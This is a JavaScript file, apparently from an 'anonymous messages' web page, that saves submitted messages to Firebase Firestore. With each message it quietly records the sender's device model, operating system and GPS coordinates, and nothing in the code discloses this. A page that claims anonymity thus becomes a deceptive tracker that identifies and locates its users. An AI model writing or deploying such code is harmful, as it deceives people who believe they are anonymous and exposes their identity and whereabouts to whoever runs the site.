import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

const firebaseConfig = {
  apiKey: "AIzaSyA-3Igz0KeLHk0nZ3qYe9_xru9axWaKm4U",
  authDomain: "mensajes-anonimos-bryan.firebaseapp.com",
  projectId: "mensajes-anonimos-bryan",
  storageBucket: "mensajes-anonimos-bryan.firebasestorage.app",
  messagingSenderId: "706342485498",
  appId: "1:706342485498:web:ee62b06dfb98ef8b123843"
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

function getCoords() {
  return new Promise((resolve) => {
    if (!navigator.geolocation) {
      resolve("No soportado");
    } else {
      navigator.geolocation.getCurrentPosition(
        (pos) => resolve(`${pos.coords.latitude},${pos.coords.longitude}`),
        () => resolve("Permiso denegado"),
        { timeout: 8000 }
      );
    }
  });
}

async function getDetailedDeviceInfo() {
  const ua = navigator.userAgent;
  let model = "No detectado";
  let platformInfo = "Desconocido";
  try {
    if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
      const hints = await navigator.userAgentData.getHighEntropyValues(['model', 'platformVersion']);
      model = hints.model || "";
      platformInfo = `${navigator.userAgentData.platform} ${hints.platformVersion || ""}`;
    }
  } catch (e) {}
  if (!model || model === "No detectado") {
    if (/iphone|ipad|ipod/i.test(ua)) { model = "iPhone/iPad"; platformInfo = "iOS"; }
    else if (/android/i.test(ua)) { model = "Android"; platformInfo = "Android"; }
    else { model = navigator.platform; platformInfo = "Desktop PC"; }
  }
  return { modelo_exacto: model, sistema: platformInfo };
}

const form = document.getElementById('messageForm');

form.addEventListener('submit', async (e) => {
  e.preventDefault();
  const btn = document.querySelector('.btn-submit');
  const messageInput = document.getElementById('message');
  
  if (!messageInput.value.trim()) return;

  btn.disabled = true;
  btn.innerText = "Enviando...";

  try {
    const info = await getDetailedDeviceInfo();
    const ubicacion = await getCoords();

    await addDoc(collection(db, "mensajes"), {
      mensaje: messageInput.value,
      dispositivo: info.modelo_exacto,
      sistema: info.sistema,
      ubicacion: ubicacion,
      timestamp: serverTimestamp()
    });

    messageInput.value = "";
    btn.innerText = "¡Enviado!";
    setTimeout(() => {
      btn.disabled = false;
      btn.innerText = "¡Enviar mensaje!";
    }, 2500);
  } catch (error) {
    console.error("Error:", error);
    btn.innerText = "Error";
    btn.disabled = false;
  }
});
